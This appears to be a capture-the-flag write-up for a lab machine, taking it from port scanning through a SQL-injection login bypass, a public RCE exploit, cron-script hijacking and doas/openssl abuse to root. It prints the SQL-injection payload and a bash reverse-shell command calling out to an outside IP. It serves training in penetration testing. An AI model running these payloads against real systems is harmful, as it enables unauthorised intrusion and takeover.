* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)

## Recon-Enumeration  

This is machine is easy, however there is some rabiit hole where you can get stuck.

Let's start with a basic enumeration -> sudo masscan -p 1-65535 -i tun0 --rate=1000 <IP>
![alt text](./img/plottedtms01.png?raw=true)

Ok, here i decided to check the port 80
![alt text](./img/plottedtms02.png?raw=true)

A default apache page, so search for directories: feroxbuster -u http://<IP> -w ~/wordlists/small.txt -d 1
![alt text](./img/plottedtms03.png?raw=true)

Visitng these links...
![alt text](./img/plottedtms04.png?raw=true)
![alt text](./img/plottedtms05.png?raw=true)
![alt text](./img/plottedtms06.png?raw=true)
![alt text](./img/plottedtms07.png?raw=true)

Damm it, nothing usefull. Returning to masscan i decide to nmap those ports
![alt text](./img/plottedtms08.png?raw=true)

Hummm, there is a http on port 445 too, so enumeration again
![alt text](./img/plottedtms09.png?raw=true)

Ok, just one find, but let's visit it
![alt text](./img/plottedtms10.png?raw=true)
![alt text](./img/plottedtms11.png?raw=true)

A basic login page, i ALWAYS use the payload <admin' or 1=1;#-- -> to test for login bypass
![alt text](./img/plottedtms12.png?raw=true)
![alt text](./img/plottedtms13.png?raw=true)

## Exploit

Visiting the site we can't find nothing usefull, so let's search for a exploit
![alt text](./img/plottedtms14.png?raw=true)

So download the 50221.py file. Reading the file i found some referencer to /classes.....
![alt text](./img/plottedtms15.png?raw=true)

However nothing about the /management, so probably we need to inform in the input. Testing....
![alt text](./img/plottedtms16.png?raw=true)

After use the 'id' command the cript return an error, however we have the url payload after INVALID URL in the last line.
So i open it on my browser and tested againd he same command
![alt text](./img/plottedtms17.png?raw=true)

Grat, we have RCE. Here i used a encoded basic reverse shell payload "bash -c 'exec bash -i &>/dev/tcp/10.17.56.17/4444 <&1'"
If you have problem with encoding i suggest this website: [urldecoder](https://meyerweb.com/eric/tools/dencoder/)
![alt text](./img/plottedtms18.png?raw=true)

## Privesc - plot_admin

Enumerating the Web folders, there is some interesnting files
![alt text](./img/plottedtms19.png?raw=true)
![alt text](./img/plottedtms20.png?raw=true)

Reading /etc/passwd we found 2 users
![alt text](./img/plottedtms21.png?raw=true)

Trying this password on these 2 users failed :(
![alt text](./img/plottedtms22.png?raw=true)

So let's check the database to look for other credential
![alt text](./img/plottedtms23.png?raw=true)
![alt text](./img/plottedtms24.png?raw=true)
![alt text](./img/plottedtms25.png?raw=true)

Decoding these hashs with [crackstation](https://crackstation.net/) we found 1 match
![alt text](./img/plottedtms26.png?raw=true)

Testing again with the 2 users failed..... again :(
![alt text](./img/plottedtms27.png?raw=true)

Continuing enumerate i found an "scripts" folder with a "backup.sh" file
![alt text](./img/plottedtms28.png?raw=true)
![alt text](./img/plottedtms29.png?raw=true)

Analyzing the script it probably is execute by some routine on the system. So i check /etc/crontab
![alt text](./img/plottedtms30.png?raw=true)

Ok, on crontab the user that execute this script is plot_admin, so we can user this to elevate privilege. However i don't have write permission on the backup.sh file, BUT i have write permision on "scripts" folder. 
So let's remover the backup.sh file and create a new one
![alt text](./img/plottedtms31.png?raw=true)
![alt text](./img/plottedtms32.png?raw=true)

Now just start a nc listener and wait
![alt text](./img/plottedtms33.png?raw=true)

Success, let's grab the flag
![alt text](./img/plottedtms41.png?raw=true)

## Privesc  - root

As basic enumeration to prives i check for SUID files "find / -perm -u=s 2>/dev/null". Where i found the "/usr/bin/doas"
![alt text](./img/plottedtms34.png?raw=true)

Usually it is used to run commands like othe user (like su). So i try it
![alt text](./img/plottedtms35.png?raw=true)

Fail again..... so let's check the doas.conf file
![alt text](./img/plottedtms36.png?raw=true)

So we can only user to run OPENSSL as ROOT. Checking the [gtfobins](https://gtfobins.github.io/) there is an interesting option 
![alt text](./img/plottedtms37.png?raw=true)

So my idea is the add a root user in /etc/passwd. To do this we generate an encrypted password and create a line to be add on the file
![alt text](./img/plottedtms38.png?raw=true)

Let's execute it on the machine and test
![alt text](./img/plottedtms39.png?raw=true)

Success, we are ROOT. Just grab the flag
![alt text](./img/plottedtms40.png?raw=true)

